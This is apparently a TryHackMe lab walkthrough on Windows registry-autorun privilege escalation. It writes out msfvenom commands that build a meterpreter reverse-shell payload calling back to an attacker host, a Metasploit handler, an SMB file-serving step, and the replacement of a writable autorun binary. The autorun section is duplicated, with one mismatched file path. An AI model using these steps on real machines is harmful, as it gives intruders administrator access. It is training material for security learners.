# Windows PrivEsc Arena

**Room Link:** [https://tryhackme.com/r/room/windowsprivescarena](https://tryhackme.com/r/room/windowsprivescarena)

## Deploy the vulnerable machine

**Kali**

```
xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568
```

### Answer the questions

**Open a command prompt and run 'net user'. Who is the other non-default user on the machine?**

**Victim**

```
net users
```

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption></figcaption></figure>

## Registry Escalation - Autorun

### Detection

**Windows VM**

1\. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

**Victim**

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption></figcaption></figure>

\
2\. In Autoruns, click on the ‘Logon’ tab.

<figure><img src="../../.gitbook/assets/image (1248).png" alt=""><figcaption></figcaption></figure>

3\. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.

<figure><img src="../../.gitbook/assets/image (1249).png" alt=""><figcaption></figcaption></figure>



\
4\. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

**Victim**

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

\
5\. From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.

<figure><img src="../../.gitbook/assets/image (1250).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Kali VM**

1\. Open command prompt and type: msfconsole

**Kali**

```
msfconsole
```

**Kali(msfconsole)**

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $KALI
run
```

\
6\. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse\_tcp lhost=\[Kali VM IP Address] -f exe -o program.exe

**Kali**

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=$KALI -f exe -o program.exe
```

\
7\. Copy the generated file, program.exe, to the Windows VM.

**Kali**

```
ss -lptn 'sport = :139'
kill -9 $PID
sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali .
```



**Windows VM**

1\. Place program.exe in ‘C:\Program Files\Autorun Program’.

**Victim**

```
copy \\$KALI\kali\reverse.exe C:\PrivEsc\reverse.exe
```

\
2\. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

**Victim**

```
xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
```



**Kali VM**

1\. Wait for a new session to open in Metasploit.

<figure><img src="../../.gitbook/assets/image (1251).png" alt=""><figcaption></figcaption></figure>



2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]

**Kali(msfconsole)**

<pre><code><strong>sessions -i 1
</strong></code></pre>

\
3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

**Kali(meterpreter)**

```
getuid
```

<figure><img src="../../.gitbook/assets/image (1252).png" alt=""><figcaption></figcaption></figure>

## Registry Escalation - Autorun

**Windows VM**

1\. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

**Victim**

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

\
2\. In Autoruns, click on the ‘Logon’ tab.\
3\. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

\
4\. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

**Victim**

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

5\. From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Kali VM**

1\. Open command prompt and type: msfconsole

**Kali**

```
msfconsole
```

2\. In Metasploit (msf > prompt) type: use multi/handler\
3\. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse\_tcp\
4\. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address]\
5\. In Metasploit (msf > prompt) type: run

**Kali(msfconsole)**

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost $KALI
run
```

\
6\. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse\_tcp lhost=\[Kali VM IP Address] -f exe -o program.exe

**Kali**

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=$KALI -f exe -o program.exe
```

\
7\. Copy the generated file, program.exe, to the Windows VM.

**Kali**

```
ss -lptn 'sport = :139'
kill -9 $PID
sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali .
```

**Victim**

```
copy \\$KALI\kali\program.exe "C:\Program Files\Autorun Program\program.exe"
```



**Windows VM**

1\. Place program.exe in ‘C:\Program Files\Autorun Program’.\
2\. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

**Kali**

```
xfreerdp +clipboard /u:TCM /p:Hacker123 /cert:ignore /v:$VICTIM /size:1024x568
```

**Kali VM**

1\. Wait for a new session to open in Metasploit.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

2\. In Metasploit (msf > prompt) type: sessions -i \[Session ID]\
3\. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>













































































































